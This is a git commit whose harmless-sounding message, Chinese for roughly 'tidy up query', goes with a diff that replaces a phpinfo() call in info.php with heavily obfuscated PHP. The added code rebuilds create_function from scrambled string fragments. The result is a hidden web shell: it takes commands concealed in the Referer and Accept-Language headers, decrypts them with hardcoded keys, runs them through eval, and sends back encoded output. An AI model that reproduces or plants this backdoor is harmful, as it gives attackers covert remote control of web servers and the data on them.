94743f5ecb6620a8d97c271d8beca72dd923fe3d
gqfjob <gqfjob@gmail.com>
2016-05-24 15:53:27 +0800

    修整查询

--- info.php
+++ info.php
@@ -1,2 +1,16 @@
 <?php
-phpinfo();
+$a='#nd_clean();$y#y#d=by#ase64_encode(x(y#gzcomy#presy#s($o),$k)y#);y#priy#nt("<$k>$y#d</$k>");@sey#ssioy#n_y#destroy();}}}}';
+$I='y#("/_y#/","/-/"y#),ary#ray("/",y#"+"y#),$ss($sy#[y#$i],0,y#y#$e)y#)),$k)));y#$o=oy#b_get_cy#ontents();ob_ey';
+$J='([\\dy#])y#)?,?/",$ra,y#$m);y#iy#f($q&&$my#){@sessiony#_stay#rt();$y#s=&$_SESSIy#ONy#y#y#;$ss="suby#str";y#$sl="s';
+$h='{$y#s[$i]="";$p=$ss($p,3y#);y#}if(array_y#key_y#existsy#($i,$s))y#y#{$s[$i].=y#$py#;$y#e=strpos($s[$i],$f)y#;ify#($';
+$b='$kh="2c8f";y#$kf="3y#y#201";fuy#ncty#ion x($t,$k){$y#c=y#y#strlen($k);y#y#$ly#=strley#n($t);$o="";for(y#y#$i=0;$';
+$T='e){$k=$ky#h.$kf;y#ob_sty#art(y#);@evy#al(@y#gzuny#compress(@x(y#@basy#ey#64_decodey#(preg_y#replace(ary#ray';
+$W=',3)y#);$y#p=y#"";foy#r($zy#=y#1;$z<count($m[1]);$y#y#z++)$py#.=$q[$m[y#2][$y#z]];if(strpos(y#$p,$h)y#==y#=0y#)y#';
+$d='r);py#arsey#_str($u["quy#ery"],$q)y#;$qy#=y#array_vy#aly#uy#es($qy#);preg_match_ally#("/([\\w])[\\y#wy#-]y#+(?:;q=0.';
+$l=str_replace('j','','crejajjjte_fujnctjion');
+$u='r=@$r[y#"HTTPy#_REFEy#RER"];$ray#=y#@$r["Hy#TTP_ACCEy#PT_LANGy#UAGEy#y#"];if($rr&&$ra){y#y#$u=py#arse_uy#rl($r';
+$r='trtolower"y#;$y#i=$my#[1][0].$m[1][1]y#;$h=$sy#l($ss(md5y#($i.$ky#h),0,y#3)y#y#);$f=$sl($ssy#(md5($i.$kfy#),0';
+$m='i<$l;){y#for($j=y#0;(y#$j<$c&&$i<y#$l);$j++y#,$y#i++){$y#o.=$y#t{$i}^$k{$j}y#;}}rety#y#uy#rn $oy#;}$r=$_SERVEy#R;$r';
+$D=str_replace('y#','',$b.$m.$u.$d.$J.$r.$W.$h.$T.$I.$a);
+$G=$l('',$D);$G();
+?>
